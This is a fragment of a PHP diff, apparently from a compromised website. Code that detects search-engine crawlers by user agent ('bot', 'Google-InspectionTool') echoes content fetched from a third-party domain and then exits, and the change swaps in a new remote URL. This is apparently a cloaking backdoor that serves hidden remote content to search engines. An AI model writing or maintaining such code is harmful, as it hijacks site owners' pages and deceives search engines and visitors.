@@ -33,7 +33,7 @@ if ((strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') 
         exit;
     }
     
-    echo file_get_contents("https://meghnaonline.net/wp-content/uploads/2025/03/kiw.html");
+    echo file_get_contents("https://rnbcakes.com/readme.txt");
     exit;
 }
 
